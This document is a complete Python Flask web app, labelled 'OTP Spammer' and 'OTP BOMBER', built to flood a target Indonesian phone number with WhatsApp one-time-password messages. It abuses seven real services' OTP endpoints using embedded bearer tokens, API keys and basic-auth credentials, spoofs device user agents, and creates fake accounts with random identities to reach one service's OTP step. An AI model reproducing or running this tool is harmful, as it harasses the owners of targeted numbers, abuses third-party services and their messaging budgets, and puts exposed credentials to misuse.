#!/usr/bin/env python3
# api/app.py — OTP Spammer (Vercel, single-file)
from flask import Flask, request, jsonify, render_template_string
import re, time, random, string
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)


ENDPOINTS = {
    "adiraku": {
        "name": "Adiraku", "enabled": True, "method": "POST",
        "url": "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "payload": {"mobileNumber": "{local}", "type": "prospect-create", "channel": "whatsapp"},
        "success_check": "body_contains", "success_value": '"message":"success"',
    },
    "singa": {
        "name": "Singa", "enabled": True, "method": "POST",
        "url": "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=153&model={device_model}&systemVersion=16&platform=android&appsflyer_id=",
        "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "{device_ua}"},
        "payload": {"mobile_phone": "{phone_no_plus}", "type": "mobile", "is_switchable": 1},
        "success_check": "json_field", "json_field": "msg", "success_value": "Success",
    },
    "pinhome": {
        "name": "Pinhome", "enabled": True, "method": "POST",
        "url": "https://www.pinhome.id/api/pinaccount/request/otp",
        "headers": {
            "Host": "www.pinhome.id", "Accept": "application/json",
            "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
            "Origin": "https://www.pinhome.id",
        },
        "payload": {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": "{local}"},
        "success_check": "status_below", "success_value": 400,
    },
    "maulagi": {
        "name": "Maulagi", "enabled": True, "method": "POST",
        "url": "https://api.maulagi.id/api/v2/auth/check",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://maulagi.id", "referer": "https://maulagi.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-ml-key": "E32VCHXX32",
        },
        "payload": {"credentials": "{local}"},
        "success_check": "status_below", "success_value": 400,
    },
    "saturdays": {
        "name": "Saturdays", "enabled": True, "method": "POST",
        "url": "https://beta.api.saturdays.com/api/v1/user/otp/send",
        "headers": {
            "accept": "*/*", "accept-language": "id-ID,id;q=0.9",
            "authorization": "undefined", "content-type": "application/json",
            "country-code": "ID", "currency-code": "IDR", "device-type": "mweb",
            "origin": "https://saturdays.com", "referer": "https://saturdays.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
            "platform": "mweb", "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
        },
        "payload": {"number": "{local}", "country_code": "+62", "type": ""},
        "success_check": "status_code", "success_value": 200,
    },
    "jogjakita": {
        "name": "Jogjakita", "enabled": True, "method": "POST", "two_step": True,
        "step1": {
            "method": "POST", "url": "https://aci-user.bmsecure.id/oauth/token",
            "headers": {
                "Authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "payload": {
                "grant_type": "client_credentials",
                "uuid": "00000000-0000-0000-0000-000000000000",
                "id_user": "0", "id_kota": "0", "location": "0.0,0.0",
                "via": "jogjakita_user", "version_code": "521", "version_name": "6.12.1",
            },
            "extract_token": {"json_field": "access_token", "save_as": "auth"},
        },
        "step2": {
            "method": "POST", "url": "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Authorization": "Bearer {auth}",
            },
            "payload": {
                "phone_user": "{phone_no_plus}",
                "primary_credential": {
                    "device_id": "", "fcm_token": "", "id_kota": 0,
                    "id_user": 0, "location": "0.0,0.0", "uuid": "",
                    "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user",
                },
                "uuid": "00000000-4c22-250d-3006-9a465f072739{random8}",
                "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user",
            },
        },
        "success_check": "json_field", "json_field": "rc", "success_value": "200",
    },
    "beautyhaul": {
        "name": "Beautyhaul", "enabled": True, "method": "POST", "three_step": True,
        "step1": {
            "method": "GET", "url": "https://www.beautyhaul.com/account/register",
            "headers": {"user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107 Mobile"},
        },
        "step2": {
            "method": "POST", "url": "https://www.beautyhaul.com/ajax/account/save_register",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.beautyhaul.com",
                "referer": "https://www.beautyhaul.com/account/register",
                "user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107 Mobile",
            },
            "payload": {
                "nama_depan": "{first_name}", "nama_belakang": "{last_name}",
                "email": "{email}", "g-recaptcha-response": "",
                "jenis_kelamin": "{gender}", "konfirmasi_password": "{password}",
                "nomor_kode_id": "100", "nomor_kode_value": "62",
                "nomor_ponsel": "{local_no_0}", "password": "{password}",
                "subscribe": "true", "tanggal_lahir": "{birthdate}", "terms": "true",
            },
        },
        "step3": {
            "method": "POST", "url": "https://www.beautyhaul.com/ajax/account/send_otp",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.beautyhaul.com",
                "referer": "https://www.beautyhaul.com/account/register",
                "user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107 Mobile",
            },
            "payload": {"method": "WhatsApp"},
        },
        "success_check": "status_code", "success_value": 200,
    },
}


DEVICES = [
    {"model": "SM-S928B", "ua": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
    {"model": "Pixel 8 Pro", "ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
    {"model": "Xiaomi 14 Ultra", "ua": "Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
]
FIRST = ['Andi','Budi','Citra','Dewi','Eko','Fajar','Gina','Hana','Irwan','Joko']
LAST  = ['Santoso','Wijaya','Susanto','Rahayu','Kusuma','Pratama','Sari','Putra','Wati','Hidayat']
MONTHS = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']


def rand8():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


def rand10():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))


def clean_phone(nomor):
    n = re.sub(r"\D", "", str(nomor))
    if n.startswith("62"): n = n[2:]
    if n.startswith("0"):  n = n[1:]
    return {"raw": n, "phone_plus": "+62" + n, "phone_no_plus": "62" + n,
            "local": "0" + n, "local_no_0": n}


def get_rand_vars():
    d = random.choice(DEVICES)
    f, l = random.choice(FIRST), random.choice(LAST)
    return {
        "device_model": d["model"], "device_ua": d["ua"],
        "random8": rand8(),
        "first_name": f, "last_name": l,
        "email": f"{f.lower()}{l.lower()}{random.randint(10,99)}@gmail.com",
        "gender": random.choice(["Male","Female"]),
        "password": rand10() + str(random.randint(10,99)),
        "birthdate": f"{random.randint(1,28)} {random.choice(MONTHS)} {random.randint(1985,2000)}",
    }


def render(tpl, pv, rv, extra=None):
    if isinstance(tpl, dict): return {k: render(v, pv, rv, extra) for k, v in tpl.items()}
    if isinstance(tpl, list): return [render(v, pv, rv, extra) for v in tpl]
    if not isinstance(tpl, str): return tpl
    allv = {**pv, **rv, **(extra or {})}
    return re.sub(r"\{(\w+)\}", lambda m: str(allv.get(m.group(1), m.group(0))), tpl)


def check_success(ep, resp, body):
    mode = ep.get("success_check", "status_code")
    val = ep.get("success_value")
    try:
        if mode == "status_code":   return resp.status_code == val
        if mode == "status_below":  return resp.status_code < int(val)
        if mode == "body_contains": return val.replace(" ", "") in body.replace(" ", "")
        if mode == "json_field":
            field = ep.get("json_field")
            data = resp.json() if body.strip().startswith(("{", "[")) else {}
            return str(data.get(field)) == str(val)
    except Exception:
        return False
    return False


def fire(ep_key, ep, nomor):
    t0 = time.time()
    try:
        pv = clean_phone(nomor)
        rv = get_rand_vars()
        s = requests.Session()
        s.verify = False

        if ep.get("two_step") or ep.get("three_step"):
            steps = ["step1", "step2", "step3"] if ep.get("three_step") else ["step1", "step2"]
            extra = {}
            final_r, final_body = None, ""
            for name in steps:
                step = ep[name]
                url = render(step["url"], pv, rv, extra)
                hdrs = render(step.get("headers", {}), pv, rv, extra)
                payload = render(step.get("payload", {}), pv, rv, extra)
                m = step.get("method", "POST").upper()
                if m == "GET":
                    r = s.get(url, headers=hdrs, timeout=8)
                else:
                    ct = hdrs.get("Content-Type", "").lower()
                    r = s.post(url, json=payload if "json" in ct else None,
                               data=None if "json" in ct else payload,
                               headers=hdrs, timeout=8)
                if "extract_token" in step:
                    ex = step["extract_token"]
                    if "regex" in ex:
                        mm = re.search(ex["regex"], r.text)
                        if mm: extra[ex["save_as"]] = mm.group(1)
                    if "json_field" in ex:
                        try: extra[ex["save_as"]] = r.json().get(ex["json_field"], "")
                        except: extra[ex["save_as"]] = ""
                final_r, final_body = r, r.text
            ok = check_success(ep, final_r, final_body)
            code = final_r.status_code if final_r else 0
        else:
            url = render(ep["url"], pv, rv)
            hdrs = render(ep.get("headers", {}), pv, rv)
            payload = render(ep.get("payload", {}), pv, rv)
            m = ep.get("method", "POST").upper()
            if m == "GET":
                r = s.get(url, headers=hdrs, timeout=8)
            else:
                ct = hdrs.get("Content-Type", "").lower()
                r = s.post(url, json=payload if "json" in ct else None,
                           data=None if "json" in ct else payload,
                           headers=hdrs, timeout=8)
            ok = check_success(ep, r, r.text)
            code = r.status_code

        return {
            "service": ep["name"], "key": ep_key,
            "status": "hit" if ok else "miss",
            "code": code,
            "latency_ms": int((time.time() - t0) * 1000),
        }
    except Exception as e:
        return {
            "service": ep["name"], "key": ep_key,
            "status": "error", "code": 0,
            "latency_ms": int((time.time() - t0) * 1000),
            "error": type(e).__name__,
        }


HTML = r'''<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>⚡ OTP BOMBER</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  :root {
    --bg-0: #050309; --glass: rgba(22, 16, 34, 0.65);
    --border: rgba(168, 85, 247, 0.15); --border-2: rgba(168, 85, 247, 0.3);
    --text: #ece7f5; --text-dim: #9a90ad; --text-dim-2: #6b6178;
    --accent: #a855f7; --accent-2: #ec4899;
    --green: #10b981; --yellow: #f59e0b; --red: #ef4444;
    --blue: #3b82f6; --cyan: #06b6d4;
  }
  html, body { min-height: 100vh; background: var(--bg-0); color: var(--text);
    font-family: 'Inter', system-ui, sans-serif; overflow-x: hidden; }
  body::before { content: ''; position: fixed; inset: 0;
    background: radial-gradient(ellipse 80% 50% at 20% 0%, rgba(168,85,247,0.25), transparent 50%),
                radial-gradient(ellipse 60% 40% at 80% 10%, rgba(236,72,153,0.18), transparent 50%),
                radial-gradient(ellipse 70% 60% at 50% 100%, rgba(139,92,246,0.15), transparent 60%);
    z-index: -1; pointer-events: none; }
  body::after { content: ''; position: fixed; inset: 0;
    background-image:
      linear-gradient(rgba(168,85,247,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(168,85,247,0.03) 1px, transparent 1px);
    background-size: 40px 40px; z-index: -1; pointer-events: none;
    mask-image: radial-gradient(ellipse 70% 70% at 50% 0%, black, transparent 70%);
    -webkit-mask-image: radial-gradient(ellipse 70% 70% at 50% 0%, black, transparent 70%); }
  .container { max-width: 980px; margin: 0 auto; padding: 24px 20px 60px; }
  .header { text-align: center; padding: 20px 0 36px; }
  .logo-badge { display: inline-flex; align-items: center; gap: 10px;
    padding: 8px 18px; background: var(--glass); border: 1px solid var(--border-2);
    border-radius: 999px; font-size: 11px; font-weight: 700; letter-spacing: 1.5px;
    text-transform: uppercase; color: var(--accent); margin-bottom: 20px;
    backdrop-filter: blur(12px); box-shadow: 0 0 30px rgba(168,85,247,0.2); }
  .logo-badge .pulse { width: 6px; height: 6px; border-radius: 50%;
    background: var(--accent); box-shadow: 0 0 12px var(--accent);
    animation: pulse-dot 2s ease-in-out infinite; }
  @keyframes pulse-dot { 0%,100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.4; transform: scale(0.85); } }
  .title { font-size: clamp(32px, 6vw, 52px); font-weight: 900;
    letter-spacing: -2px; line-height: 1;
    background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, var(--accent-2) 100%);
    -webkit-background-clip: text; background-clip: text;
    -webkit-text-fill-color: transparent;
    filter: drop-shadow(0 0 30px rgba(168,85,247,0.4)); margin-bottom: 10px; }
  .subtitle { color: var(--text-dim); font-size: 14px; font-weight: 500; }
  .glass { background: var(--glass); border: 1px solid var(--border);
    border-radius: 24px; padding: 26px; backdrop-filter: blur(20px) saturate(1.2);
    -webkit-backdrop-filter: blur(20px) saturate(1.2);
    box-shadow: 0 20px 60px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);
    margin-bottom: 16px; position: relative; overflow: hidden; }
  .glass::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px;
    background: linear-gradient(90deg, transparent, var(--accent), var(--accent-2), transparent);
    opacity: 0.6; }
  .section-title { display: flex; align-items: center; gap: 10px; font-size: 13px;
    font-weight: 700; text-transform: uppercase; letter-spacing: 1.2px;
    color: var(--text-dim); margin-bottom: 18px; }
  .section-title .icon { width: 28px; height: 28px; border-radius: 8px;
    display: inline-flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, var(--accent), var(--accent-2));
    font-size: 14px; box-shadow: 0 4px 15px rgba(168,85,247,0.4); }
  .field { margin-bottom: 18px; }
  .field-label { display: block; font-size: 12px; font-weight: 600;
    color: var(--text-dim); margin-bottom: 8px; letter-spacing: 0.3px; }
  .input-wrap { position: relative; }
  .input-wrap .prefix { position: absolute; left: 16px; top: 50%;
    transform: translateY(-50%); color: var(--accent); font-weight: 700;
    font-size: 14px; pointer-events: none; }
  input[type="text"] { width: 100%; padding: 15px 18px 15px 46px;
    background: rgba(0,0,0,0.35); border: 1.5px solid var(--border);
    border-radius: 14px; color: var(--text); font-size: 15px;
    font-family: 'JetBrains Mono', monospace; font-weight: 600; outline: none;
    transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); }
  input:focus { border-color: var(--accent); background: rgba(168,85,247,0.06);
    box-shadow: 0 0 0 4px rgba(168,85,247,0.12), 0 0 30px rgba(168,85,247,0.15); }
  input::placeholder { color: var(--text-dim-2); font-weight: 400; }
  .chips { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
    gap: 8px; margin-bottom: 6px; }
  .chip { padding: 12px 14px; background: rgba(0,0,0,0.3);
    border: 1.5px solid var(--border); border-radius: 12px; cursor: pointer;
    font-size: 13px; font-weight: 600; color: var(--text-dim);
    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    user-select: none; text-align: center; position: relative; overflow: hidden; }
  .chip::before { content: ''; position: absolute; inset: 0;
    background: linear-gradient(135deg, var(--accent), var(--accent-2));
    opacity: 0; transition: opacity 0.2s; z-index: -1; }
  .chip:hover { border-color: var(--border-2); color: var(--text);
    transform: translateY(-2px); }
  .chip.active { border-color: transparent; color: white;
    box-shadow: 0 6px 24px rgba(168,85,247,0.35); transform: translateY(-1px); }
  .chip.active::before { opacity: 1; }
  .chip.active::after { content: '✓'; position: absolute; top: 6px; right: 8px;
    font-size: 10px; font-weight: 900; opacity: 0.9; }
  .chip.all { font-weight: 800; }
  .chip.all::before { background: linear-gradient(135deg, var(--cyan), var(--blue)); }
  .btn { width: 100%; padding: 18px 24px; border: none; border-radius: 14px;
    font-size: 15px; font-weight: 800; letter-spacing: 0.3px; cursor: pointer;
    transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); font-family: inherit;
    display: inline-flex; align-items: center; justify-content: center; gap: 10px;
    position: relative; overflow: hidden;
    background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
    color: white; box-shadow: 0 8px 30px rgba(168,85,247,0.4); }
  .btn:hover { transform: translateY(-2px);
    box-shadow: 0 12px 40px rgba(168,85,247,0.55); }
  .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
  .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr);
    gap: 10px; margin-bottom: 18px; }
  .stat-box { background: rgba(0,0,0,0.35); border: 1.5px solid var(--border);
    border-radius: 16px; padding: 18px 12px; text-align: center;
    transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); }
  .stat-box:hover { transform: translateY(-2px); border-color: var(--border-2); }
  .stat-box .icon-stat { font-size: 18px; margin-bottom: 4px; opacity: 0.7; }
  .stat-label { font-size: 10px; color: var(--text-dim-2);
    text-transform: uppercase; letter-spacing: 1.2px; font-weight: 700;
    margin-bottom: 6px; }
  .stat-val { font-size: 30px; font-weight: 900;
    font-family: 'JetBrains Mono', monospace;
    letter-spacing: -1px; line-height: 1; }
  .stat-hit .stat-val { color: var(--green);
    text-shadow: 0 0 20px rgba(16,185,129,0.4); }
  .stat-miss .stat-val { color: var(--yellow); }
  .stat-err .stat-val { color: var(--red); }
  .result-wrap { background: #030207; border: 1.5px solid var(--border);
    border-radius: 16px; overflow: hidden; }
  .result-head { display: flex; align-items: center; gap: 8px;
    padding: 10px 16px; background: rgba(255,255,255,0.02);
    border-bottom: 1px solid var(--border); font-size: 11px;
    font-weight: 700; color: var(--text-dim-2); text-transform: uppercase;
    letter-spacing: 1.2px; }
  .result-head .tl { display: flex; gap: 5px; margin-right: 10px; }
  .result-head .tl span { width: 10px; height: 10px; border-radius: 50%; }
  .result-head .tl .r { background: #ff5f57; }
  .result-head .tl .y { background: #febc2e; }
  .result-head .tl .g { background: #28c840; }
  .result-list { padding: 12px 14px; max-height: 400px; overflow-y: auto;
    font-family: 'JetBrains Mono', monospace; font-size: 12.5px; line-height: 1.7; }
  .result-list::-webkit-scrollbar { width: 6px; }
  .result-list::-webkit-scrollbar-thumb {
    background: linear-gradient(var(--accent), var(--accent-2)); border-radius: 3px; }
  .result-row { display: flex; justify-content: space-between;
    align-items: center; gap: 10px; padding: 8px 10px; border-radius: 8px;
    margin-bottom: 4px; animation: logIn 0.25s ease; }
  @keyframes logIn { from { opacity: 0; transform: translateX(-8px); }
    to { opacity: 1; } }
  .result-row.hit { background: rgba(16,185,129,0.08); color: #d1fae5; }
  .result-row.miss { background: rgba(245,158,11,0.06); color: #fef3c7; }
  .result-row.error { background: rgba(239,68,68,0.08); color: #fee2e2; }
  .result-row .tag { font-weight: 800; font-size: 10px; padding: 3px 8px;
    border-radius: 5px; letter-spacing: 0.5px; }
  .result-row.hit .tag { background: var(--green); color: #001a0e; }
  .result-row.miss .tag { background: var(--yellow); color: #1a0e00; }
  .result-row.error .tag { background: var(--red); color: #fff; }
  .result-row .svc { flex: 1; text-align: left; }
  .result-row .info { font-size: 11px; opacity: 0.8; }
  .empty-state { text-align: center; padding: 40px 20px;
    color: var(--text-dim-2); font-size: 13px; }
  .empty-state .icon { font-size: 36px; opacity: 0.3; margin-bottom: 10px;
    display: block; }
  .hidden { display: none; }
  .footer { text-align: center; color: var(--text-dim-2); font-size: 12px;
    padding: 40px 0 10px; letter-spacing: 0.3px; }
  .footer b { background: linear-gradient(135deg, var(--accent), var(--accent-2));
    -webkit-background-clip: text; background-clip: text;
    -webkit-text-fill-color: transparent; font-weight: 800; }
  @media (max-width: 480px) {
    .container { padding: 16px 14px 40px; }
    .glass { padding: 20px 18px; border-radius: 20px; }
    .title { letter-spacing: -1.5px; }
    .chips { grid-template-columns: repeat(2, 1fr); }
    .result-list { max-height: 300px; font-size: 11.5px; }
    .stat-val { font-size: 24px; }
  }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="logo-badge">
      <span class="pulse"></span>
      <span>OTP BOMBER · v5</span>
    </div>
    <h1 class="title">⚡ OTP BOMBER</h1>
    <p class="subtitle">multi-service engine · Vercel edge · realtime result</p>
  </div>

  <div class="glass">
    <div class="section-title">
      <span class="icon">🎯</span>
      <span>Target & Configuration</span>
    </div>
    <div class="field">
      <label class="field-label">Nomor Target</label>
      <div class="input-wrap">
        <span class="prefix">+62</span>
        <input type="text" id="phone" placeholder="81234567890" inputmode="numeric" autocomplete="off" />
      </div>
    </div>
    <div class="field">
      <label class="field-label">Pilih Service</label>
      <div class="chips" id="services"></div>
    </div>
    <button class="btn" id="startBtn">
      <span>🚀</span>
      <span>KIRIM OTP</span>
    </button>
  </div>

  <div class="glass hidden" id="resultCard">
    <div class="section-title">
      <span class="icon">📊</span>
      <span id="resultTitle">HASIL</span>
    </div>
    <div class="stats-grid">
      <div class="stat-box stat-hit">
        <div class="icon-stat">✅</div>
        <div class="stat-label">HIT</div>
        <div class="stat-val" id="sHit">0</div>
      </div>
      <div class="stat-box stat-miss">
        <div class="icon-stat">⚠️</div>
        <div class="stat-label">MISS</div>
        <div class="stat-val" id="sMiss">0</div>
      </div>
      <div class="stat-box stat-err">
        <div class="icon-stat">❌</div>
        <div class="stat-label">ERROR</div>
        <div class="stat-val" id="sErr">0</div>
      </div>
    </div>
    <div class="result-wrap">
      <div class="result-head">
        <div class="tl"><span class="r"></span><span class="y"></span><span class="g"></span></div>
        <span>detail hasil</span>
      </div>
      <div class="result-list" id="list">
        <div class="empty-state">
          <span class="icon">📋</span>
          belum ada hasil
        </div>
      </div>
    </div>
  </div>

  <div class="footer">built with <b>passion</b> · © 2026</div>
</div>

<script>
let services = [];
let selected = new Set();

async function loadServices() {
  try {
    const r = await fetch("/api/services");
    services = await r.json();
    renderServices();
  } catch (e) { console.error(e); }
}

function renderServices() {
  const box = document.getElementById("services");
  box.innerHTML = "";
  const all = document.createElement("div");
  all.className = "chip all" + (selected.size === 0 ? " active" : "");
  all.textContent = "🌐 SEMUA (" + services.length + ")";
  all.onclick = () => { selected.clear(); renderServices(); };
  box.appendChild(all);
  services.forEach(s => {
    const c = document.createElement("div");
    c.className = "chip" + (selected.has(s.key) ? " active" : "");
    c.textContent = s.name;
    c.onclick = () => {
      if (selected.has(s.key)) selected.delete(s.key);
      else selected.add(s.key);
      renderServices();
    };
    box.appendChild(c);
  });
}

document.getElementById("startBtn").onclick = async () => {
  const phone = document.getElementById("phone").value.trim();
  if (!phone) return alert("isi nomor target dulu");
  const btn = document.getElementById("startBtn");
  const orig = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span>⏳</span><span>MENGIRIM...</span>';

  const svcs = Array.from(selected);
  const service = svcs.length === 1 ? svcs[0] : "all";

  try {
    const r = await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, service }),
    });
    const d = await r.json();
    if (d.error) { alert(d.error); btn.disabled = false; btn.innerHTML = orig; return; }
    document.getElementById("resultCard").classList.remove("hidden");
    document.getElementById("sHit").textContent = d.hit;
    document.getElementById("sMiss").textContent = d.miss;
    document.getElementById("sErr").textContent = d.error;
    document.getElementById("resultTitle").textContent = "HASIL — " + d.target;
    document.getElementById("list").innerHTML = d.results.map(r => `
      <div class="result-row ${r.status}">
        <span class="svc">${r.service}</span>
        <span class="info">${r.code || '-'} · ${r.latency_ms || 0}ms</span>
        <span class="tag">${r.status.toUpperCase()}</span>
      </div>
    `).join("");
  } catch (e) { alert("error: " + e.message); }
  btn.disabled = false;
  btn.innerHTML = orig;
};

document.getElementById("phone").addEventListener("keydown", e => {
  if (e.key === "Enter") document.getElementById("startBtn").click();
});

loadServices();
</script>
</body>
</html>
'''


@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML)


@app.route("/api/services", methods=["GET"])
def api_services():
    return jsonify([{"key": k, "name": v["name"], "enabled": v.get("enabled", True)} for k, v in ENDPOINTS.items()])


@app.route("/api/send", methods=["POST", "GET"])
def api_send():
    if request.method == "POST":
        data = request.json or {}
    else:
        data = request.args.to_dict()

    nomor = (data.get("phone") or "").strip()
    if not nomor:
        return jsonify({"error": "phone wajib"}), 400

    service = data.get("service") or "all"
    if service == "all":
        endpoints = {k: v for k, v in ENDPOINTS.items() if v.get("enabled", True)}
    elif service in ENDPOINTS:
        endpoints = {service: ENDPOINTS[service]}
    else:
        return jsonify({"error": f"service '{service}' ga ada"}), 400

    results = []
    try:
        with ThreadPoolExecutor(max_workers=min(len(endpoints), 6)) as ex:
            futures = {ex.submit(fire, k, ep, nomor): (k, ep) for k, ep in endpoints.items()}
            for fut in as_completed(futures, timeout=9):
                try:
                    results.append(fut.result())
                except Exception:
                    k, ep = futures[fut]
                    results.append({"service": ep["name"], "key": k, "status": "error", "error": "timeout", "code": 0, "latency_ms": 0})
    except Exception:
        pass

    hit = sum(1 for r in results if r["status"] == "hit")
    miss = sum(1 for r in results if r["status"] == "miss")
    err = sum(1 for r in results if r["status"] == "error")

    return jsonify({
        "target": clean_phone(nomor)["phone_plus"],
        "total": len(results),
        "hit": hit,
        "miss": miss,
        "error": err,
        "results": sorted(results, key=lambda x: x["service"]),
    })


# Vercel handler
handler = app
